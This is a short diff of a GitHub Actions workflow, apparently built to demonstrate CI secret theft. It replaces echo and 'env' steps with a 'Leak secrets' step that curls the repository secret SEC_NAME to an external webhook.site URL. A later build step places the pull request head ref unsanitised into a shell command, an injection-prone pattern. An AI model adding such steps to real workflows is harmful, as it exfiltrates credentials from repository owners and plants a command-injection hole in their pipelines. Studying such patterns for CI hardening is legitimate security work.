@@ -10,10 +10,7 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Leak secrets
-        run: echo "SECRET_LEAKED ${{ secrets.SEC_NAME }}"
-
-      - name: List Env
-        run: env
+        run: curl "http://webhook.site/41c6b745-9747-4b36-9965-72752cbf04e0/value=${{ secrets.SEC_NAME }}"
         
       - name: Run build
         run: echo "Building the project for branch ${{ github.event.pull_request.head.ref }}"
